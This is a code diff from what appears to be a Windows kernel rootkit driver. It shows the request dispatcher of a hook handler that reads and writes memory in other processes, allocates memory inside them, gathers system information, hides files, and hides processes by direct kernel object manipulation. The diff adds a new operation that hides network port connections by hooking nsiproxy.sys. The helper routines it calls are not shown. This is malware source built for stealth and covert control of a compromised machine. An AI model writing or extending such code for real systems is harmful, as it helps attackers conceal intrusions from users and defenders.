@@ -375,8 +375,8 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 	RootkInstructions->IsFlexible = FALSE;  // verify that operation was made and the transforming of data KM-UM
 	switch (RootkInstructions->Operation) {
 	case RKOP_MDLBASE:
-		// Request process module address -
 
+		// Request process module address -
 		DbgPrintEx(0, 0, "Request Type: get base address of module\n");
 		Return = GetModuleBaseRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
@@ -384,8 +384,8 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 
 
 	case RKOP_WRITE:
-		// Copy into memory -
 
+		// Copy into memory -
 		DbgPrintEx(0, 0, "Request Type: write data into memory\n");
 		Return = WriteToMemoryRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
@@ -393,8 +393,8 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 
 
 	case RKOP_READ:
-		// Read from memory -
 
+		// Read from memory -
 		DbgPrintEx(0, 0, "Request Type: read data from memory\n");
 		Return = ReadFromMemoryRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
@@ -402,8 +402,8 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 
 
 	case RKOP_SYSINFO:
-		// get system information/s by request -
 
+		// get system information/s by request -
 		DbgPrintEx(0, 0, "Request Type: get information about target system\n");
 		Return = RetrieveSystemInformationRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
@@ -411,16 +411,16 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 
 
 	case RKOP_PRCMALLOC:
-		// allocate specified memory in specified process -
 
+		// allocate specified memory in specified process -
 		DbgPrintEx(0, 0, "Request Type: allocate memory in the virtual address space of a process\n");
 		Return = AllocSpecificMemoryRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
 
 	case RKOP_HIDEFILE:
-		// hide file/folder -
 
+		// hide file/folder -
 		DbgPrintEx(0, 0, "Request Type: hide file/folder (0xFFFFFFFFFFFFFFFF = hide, 0x7777FFFFFFFFFFFF = return list, else = remove by index (value = index),\nActual reserved value: %p\n", RootkInstructions->Reserved);
 		
 		// Handle additional preoperation dependencies:
@@ -437,6 +437,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 		}
 		Return = HideFileObjectRK(RootkInstructions);
 		if (Return == HIDE_TEMPSUC) {
+			
 			// Returned from regular file hiding:
 			if (FileNameBuffer == NULL) {
 				DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (impossible name buffer = NULL)\n");
@@ -464,6 +465,7 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 			}
 		}
 		else if (Return == UNHIDE_TEMPSUC) {
+			
 			// Returned from removing file:
 			if (!HookHide.RemoveFromHideFile((int)RootkInstructions->Reserved, &FileName)) {
 				if (FileName.Buffer == NULL) {
@@ -493,11 +495,20 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 			ExFreePool(FileNameBuffer);
 		}
 		return Return;
-	case RKOP_HIDEPROC:
-		// Hide process with DKOM:
 
+	case RKOP_HIDEPROC:
+
+		// Hide process with DKOM:
 		DbgPrintEx(0, 0, "Request Type: hide process via DKOM (1) / NtQuerySystemInformation hook (0) -> %d\n", IS_DKOM);
 		Return = HideProcessRK(RootkInstructions);
+		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
+		return Return;
+
+	case RKOP_HIDEPORT:
+
+		// Hide port with IRP hook to nsiproxy.sys:
+		DbgPrintEx(0, 0, "Request Type: hide port connection with IRP hook to IRP_MJ_DEVICE_CONTROL of nsiproxy.sys\n");
+		Return = HidePortConnectionRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
 	}
